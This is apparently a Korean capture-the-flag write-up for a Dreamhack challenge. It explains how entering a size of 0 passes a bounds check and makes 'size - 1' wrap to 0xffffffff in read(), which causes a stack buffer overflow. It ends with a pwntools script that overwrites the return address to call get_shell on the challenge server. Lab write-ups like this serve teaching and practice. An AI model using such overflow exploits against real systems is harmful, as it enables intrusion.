# 문제명

## 문제 설명

Integer Underflow(정수 언더플로우) 취약점을 이해하고 이를 이용해서 버퍼 오버플로우를 유발하여 프로그램의 흐름을 조작하는 문제입니다. 입력받은 크기 검증 로직의 허점을 뚫고 get_shell 함수를 실행시켜 플래그를 획득해야 합니다.

- nc host3.dreamhack.games 14779

## 풀이

### 분석

이 프로그램은 32비트 x86 아키텍처 기반으로 작성되었으며, 사용자로부터 숫자를 입력받아 size 변수에 저장한 뒤에 그 크기만큼 buf라는 이름의 배열에 데이터를 입력받는 단순한 구조를 가지고 있습니다. 소스코드를 분석해 보면 데이터를 저장하는 공간인 buf는 스택 메모리 상에서 ebp 레벨로부터 0x100 바이트, 즉 256 바이트만큼의 크기를 할당받아 위치하고 있습니다. 공격자의 최종 목적은 이 프로그램의 정상적인 실행 흐름을 끊고 메모리 내부의 0x8048659 주소에 존재하는 get_shell 함수를 강제로 호출하여 서버의 권한을 획득하는 것입니다.

### 취약점

이 문제에서 핵심이 되는 보안 취약점은 정수 언더플로우에서 비롯됩니다. 프로그램 내에는 사용자가 너무 큰 값을 입력하여 버퍼가 넘치는 것을 막기 위해 입력받은 size가 256보다 크거나 0보다 작은지 검사하여 프로그램을 종료하는 방어 로직이 존재합니다. 하지만 공격자가 size에 정확히 0을 입력하게 되면 0은 256보다 크지 않고 0보다 작지도 않으므로 이 검증 조건문을 아무런 제약 없이 통과하게 됩니다. 진짜 문제는 그 이후 데이터를 실제로 읽어오는 read 함수 내부의 size - 1 연산에서 발생합니다. size 변수의 값이 0일 때 size - 1은 부호가 있는 정수 관점에서는 -1이 되지만 read 함수의 세 번째 인자인 count는 부호가 없는 정수형 타입인 size_t 형으로 정의되어 있습니다. 컴퓨터 시스템에서 부호 있는 정수 -1을 부호 없는 정수로 변환하여 해석하게 되면, 이 값은 부호 없는 정수가 가질 수 있는 양의 최댓값인 4,294,967,295(16진수로 0xffffffff)라는 엄청나게 큰 숫자로 둔갑하게 됩니다. 결과적으로 시스템은 단 256 바이트 크기만 수용할 수 있는 buf 공간에 거의 무한대에 가까운 크기의 데이터를 마음대로 입력할 수 있도록 허용하게 되며 이 과정에서 치명적인 스택 버퍼 오버플로우 취약점이 발생합니다.

### 익스플로잇

메모리를 조작하기 위해 가장 먼저 해야 할 일은 입력 버퍼부터 리턴 주소까지의 정확한 거리를 계산하는 것입니다. 본 문제는 32비트 환경이므로 데이터가 저장되는 buf 공간인 256 바이트와 함수가 종료될 때 참조할 이전 프레임의 기준점인 SFP 공간 4 바이트를 더해 총 260 바이트만큼의 영역을 의미 없는 더미 데이터로 가득 채워야 합니다. 이렇게 스택을 가득 채우고 나면 바로 다음에 함수가 종료된 후 돌아갈 목적지 주소인 리턴 주소 영역이 나타나게 되는데 이 자리를 우리가 실행하고자 하는 get_shell 함수의 주소인 0x8048659로 변조하면 됩니다. 이를 자동화하기 위해 파이썬의 pwntools 라이브러리를 활용하여 익스플로잇 코드를 작성할 수 있습니다.

```python

from pwn import *

p = remote("host3.dreamhack.games", 14779)
get_shell = 0x8048659

p.recvuntil(b"Size: ")
p.sendline(b"0")

payload = b"A" * 260
payload += p32(get_shell)

p.recvuntil(b"Data: ")
p.send(payload)

p.interactive()

```
